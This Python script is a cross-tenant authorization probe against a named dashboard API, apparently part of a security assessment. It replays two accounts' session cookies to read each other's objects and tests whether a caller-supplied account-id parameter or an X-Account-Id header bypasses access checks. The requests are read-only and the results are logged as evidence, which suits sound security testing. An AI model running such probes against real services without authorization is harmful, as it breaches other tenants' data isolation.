#!/usr/bin/env python3
"""Round 6b: cross-tenant broken-object-level-authorization probe (OWASP API1:2023).

Two independent exported dashboard sessions (A = original, B = second account).
Every request is a GET and never mutates state. Cookie values are read from the
jars, used only in the Cookie header, and never written to any artifact.
"""
import gzip
import hashlib
import json
import os
import re
import time
import urllib.error
import urllib.parse
import urllib.request

BASE = "https://dashboard-api.apps.fortyguard.com"
DASH = "https://dashboard.fortyguard.com"
OUT = "evidence/round6/bola.json"
UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) "
      "Chrome/157.0.0.0 Safari/537.36")
JARS = {
    "A": "current_session_cookies/current_session_cookies.json",
    "B": "current_session_cookies/current_session_cookies_second_account.json",
}
MAX = 4096  # the demo heatmap body is ~26 MB; cap everything


def cookie_header(jar):
    return "; ".join(f"{c['name']}={c['value']}" for c in jar)


def decode(body, encoding):
    if encoding == "gzip":
        try:
            return gzip.decompress(body), True
        except (OSError, EOFError):
            return body, False
    return body, True  # br/identity: not decoded here


def get(jar, path, extra=None, read_cap=MAX):
    req = urllib.request.Request(BASE + path, method="GET")
    req.add_header("Cookie", cookie_header(jar))
    req.add_header("Accept", "application/json, text/plain, */*")
    req.add_header("Accept-Encoding", "gzip")
    req.add_header("Origin", DASH)
    req.add_header("Referer", DASH + "/")
    req.add_header("User-Agent", UA)
    for k, v in (extra or {}).items():
        req.add_header(k, v)
    t0 = time.time()
    rec = {"path": path, "extra_headers": list((extra or {}).keys())}
    try:
        with urllib.request.urlopen(req, timeout=45) as r:
            body = r.read(read_cap)
            rec.update(status=r.status, ms=round(time.time() - t0, 3),
                       content_length=r.headers.get("Content-Length"),
                       content_encoding=r.headers.get("Content-Encoding"))
    except urllib.error.HTTPError as e:
        body = e.read(read_cap)
        rec.update(status=e.code, ms=round(time.time() - t0, 3),
                   content_encoding=e.headers.get("Content-Encoding"))
    except Exception as e:  # noqa: BLE001 - a timeout is itself a datapoint
        rec.update(status=None, error=type(e).__name__, ms=round(time.time() - t0, 3))
        return rec, b""

    raw = body
    body, ok = decode(body, rec.get("content_encoding"))
    rec["bytes"] = len(body)
    rec["decoded"] = len(body) != len(raw)
    if not ok:
        rec["partial_body"] = True
        sha = hashlib.sha256(body).hexdigest()
        rec["sha256"] = sha[:16]
        return rec, body

    rec["sha256"] = hashlib.sha256(body).hexdigest()[:16]
    text = body.decode("utf-8", "replace")
    try:
        j = json.loads(text)
    except ValueError:
        rec["text_head"] = text[:200]
        return rec, body
    if isinstance(j, dict):
        rec["message"] = str(j.get("message"))[:160]
        rec["keys"] = list(j.keys())
        d = j.get("data")
        rec["data_type"] = type(d).__name__
        rec["body_bytes"] = len(body)
        if isinstance(d, dict):
            rec["data_keys"] = list(d.keys())[:12]
        elif isinstance(d, list):
            rec["data_len"] = len(d)
    return rec, body


def dig(obj, keys):
    """First value found for any of `keys`, breadth-first through nested dicts."""
    queue = [obj]
    while queue:
        cur = queue.pop(0)
        if isinstance(cur, dict):
            for k in keys:
                if k in cur and cur[k] not in (None, "", [], {}):
                    return cur[k]
            queue.extend(v for v in cur.values() if isinstance(v, (dict, list)))
        elif isinstance(cur, list):
            queue.extend(v for v in cur if isinstance(v, (dict, list)))
    return None


def identity(jar, label):
    rec, body = get(jar, "/auth/verify-access?initial=true", read_cap=400_000)
    ident = {"label": label, "status": rec.get("status"), "ms": rec.get("ms"), "bytes": rec.get("bytes")}
    try:
        payload = json.loads(body.decode("utf-8", "replace"))
    except ValueError:
        ident["parse_error"] = "not json"
        return ident, rec
    data = payload.get("data")
    ident["envelope_keys"] = list(payload.keys())
    ident["data_type"] = type(data).__name__
    if isinstance(data, dict):
        ident["data_keys"] = list(data.keys())
    ident.update(
        account_id=dig(payload, ["account_id"]),
        role=dig(payload, ["role"]),
        allowed_features=dig(payload, ["allowed_features"]),
        demo_heatmap_id=dig(payload, ["demo_heatmap_id"]),
        user_settings=dig(payload, ["user_settings"]),
    )
    subs = dig(payload, ["subscriptions"])
    if isinstance(subs, dict):
        ident["subscription_keys"] = list(subs.keys())
        base = subs.get("base_subscription") if isinstance(subs.get("base_subscription"), dict) else None
        if base:
            ident["subscription_id"] = base.get("base_subscp_id")
            ident["location_id"] = base.get("location_id")
            ident["subscription_status"] = base.get("subscription_status") or base.get("status")
    return ident, rec


def collect_ids():
    """UUIDs of objects this account created, harvested from earlier evidence."""
    ids = {}
    pat = re.compile(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}")
    for root, _dirs, files in os.walk("evidence"):
        for f in files:
            if not f.endswith(".json") or f == "bola.json":
                continue
            p = os.path.join(root, f)
            try:
                blob = open(p, encoding="utf-8", errors="replace").read()
            except OSError:
                continue
            for key in ("heatmap_id", "activity_id", "monitor_id"):
                for m in re.finditer(rf'"{key}"\s*:\s*"({pat.pattern})"', blob):
                    ids.setdefault(m.group(1), set()).add(key)
    return {k: sorted(v) for k, v in ids.items()}


def main():
    jars = {}
    for label, p in JARS.items():
        if not os.path.exists(p):
            raise SystemExit(f"missing jar {label}: {p}")
        jars[label] = json.load(open(p, encoding="utf-8"))
        print(f"jar {label}: {len(jars[label])} cookies ({', '.join(c['name'] for c in jars[label])})")

    report = {"captured_at_utc": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
              "base": BASE, "read_only": True, "identities": {}, "paired_reads": [],
              "object_probes": [], "credits": [], "header_override": []}

    for label, jar in jars.items():
        ident, rec = identity(jar, label)
        report["identities"][label] = ident
        print(f"\nidentity {label}: {ident.get('status')} envelope={ident.get('envelope_keys')} "
              f"data={ident.get('data_keys')}")
        print(f"   account={ident.get('account_id')} role={ident.get('role')} "
              f"sub={ident.get('subscription_id')} loc={ident.get('location_id')} "
              f"demo={ident.get('demo_heatmap_id')}")

    acc = {k: v.get("account_id") for k, v in report["identities"].items()}

    def paired(path, cap=120_000):
        row = {"path": path, "results": {}}
        for label, jar in jars.items():
            rec, _ = get(jar, path, read_cap=cap)
            row["results"][label] = rec
        a = row["results"].get("A", {})
        b = row["results"].get("B", {})
        identical = (a.get("sha256") == b.get("sha256"))
        print(f"  {path}\n    A={a.get('status')} {a.get('bytes')}B "
              f"{a.get('sha256','')}·{a.get('message','')[:40]}\n"
              f"    B={b.get('status')} {b.get('bytes')}B "
              f"{b.get('sha256','')}·{b.get('message','')[:40]}\n"
              f"    identical_across_accounts={identical}")
        row["identical_across_accounts"] = identical
        report["paired_reads"].append(row)
        return row

    for path in ["/heatmaps/?num=0", "/activity/user-stats",
                 "/voting/submissions?search=&page=1&page_size=8"]:
        paired(path)

    # Object-level probes: UUIDs from evidence, plus each identity's own demo,
    # plus a controlled cross-tenant read: B fetches A's demo heatmap.
    owned = collect_ids()
    print(f"\nharvested object ids from evidence: {len(owned)}")
    demoA = report["identities"]["A"].get("demo_heatmap_id")
    demoB = report["identities"]["B"].get("demo_heatmap_id")
    targets = []
    if demoA:
        targets.append(("demo_A", demoA))
    if demoB and demoB != demoA:
        targets.append(("demo_B", demoB))
    for k, v in list(owned.items())[:6]:
        targets.append((k.split("_")[0], v[0]))

    seen = set()
    for kind, oid in targets:
        if not oid or oid in seen:
            continue
        seen.add(oid)
        row = {"object_id": oid, "kind": kind, "results": {}}
        for label, jar in jars.items():
            rec, _ = get(jar, f"/heatmaps/{oid}", read_cap=2048)
            row["results"][label] = rec
            sig = "trunc" if rec.get("partial_body") else f"{rec.get('bytes')}B {rec.get('sha256','')}"
            extra = " · partial gzip" if rec.get("partial_body") else ""
            print(
                f"  /heatmaps/{oid[:8]}… ({kind}) as {label}: "
                f"{rec.get('status')} read={sig}{extra}\n"
                f"    {rec.get('content_length') or '-'}B declared",
            )
        report["object_probes"].append(row)

    # account-id is caller-supplied: can B read A's credits barrier?
    if acc.get("A") or acc.get("B"):
        seen = set()
        for label, jar in jars.items():
            for owner in ("A", "B"):
                if not acc.get(owner):
                    continue
                q = "/activity/get-credits?account-id=" + urllib.parse.quote(str(acc[owner]), safe="")
                rec, _ = get(jar, q, read_cap=8192)
                row = {"caller": label, "owner": owner}
                sig = "trunc" if rec.get("partial_body") else (f"{rec.get('bytes')}B {rec.get('sha256','')}")
                row["signature"] = sig
                row.update(rec)
                report["credits"].append(row)
                print(
                    f"  credits caller={label} owner={owner}: "
                    f"{rec.get('status')} {sig}\n"
                    f"    {rec.get('message','')[:40]}",
                )

    # Does the API trust a client-supplied identity header?
    for label, jar in jars.items():
        other = "B" if label == "A" else "A"
        if not acc.get(other):
            continue
        rec, _ = get(jar, "/activity/user-stats", extra={"X-Account-Id": str(acc[other])})
        row = {"caller": label, "claimed": other}
        sig = "trunc" if rec.get("partial_body") else (f"{rec.get('bytes')}B {rec.get('sha256','')}")
        row["signature"] = sig
        row.update(rec)
        report["header_override"].append(row)
        print(
            f"  user-stats caller={label} X-Account-Id={other}: "
            f"{rec.get('status')} {sig}\n"
            f"    {rec.get('message','')[:40]}",
        )

    os.makedirs(os.path.dirname(OUT), exist_ok=True)
    json.dump(report, open(OUT, "w", encoding="utf-8"), indent=2)
    print("\nwrote", OUT)


if __name__ == "__main__":
    main()
